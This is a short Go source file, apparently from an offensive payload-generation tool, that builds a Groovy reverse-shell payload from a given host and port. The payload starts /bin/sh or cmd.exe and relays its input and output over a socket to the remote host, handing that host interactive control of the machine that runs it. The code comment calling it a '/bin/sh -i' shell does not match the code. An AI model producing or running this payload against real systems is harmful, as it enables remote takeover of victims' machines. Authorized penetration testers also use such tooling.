package reverse

import (
	"fmt"
)

const (
	GroovyDefault = GroovyClassic
	GroovyClassic = `shell='/bin/sh';if(System.getProperty('os.name').indexOf('Windows')!=-1)` +
		`shell='cmd.exe';Process p=new ProcessBuilder(shell).redirectErrorStream(true).start();` +
		`Socket s=new Socket('%s',%d);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),` +
		`si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();` +
		`while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)` +
		`so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();` +
		`Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`
)

func (groovy *GroovyPayload) Default(lhost string, lport int) string {
	return groovy.GroovyClassic(lhost, lport)
}

// A short payload that creates a reverse shell using /bin/sh -i.
func (groovy *GroovyPayload) GroovyClassic(lhost string, lport int) string {
	return fmt.Sprintf(GroovyClassic, lhost, lport)
}
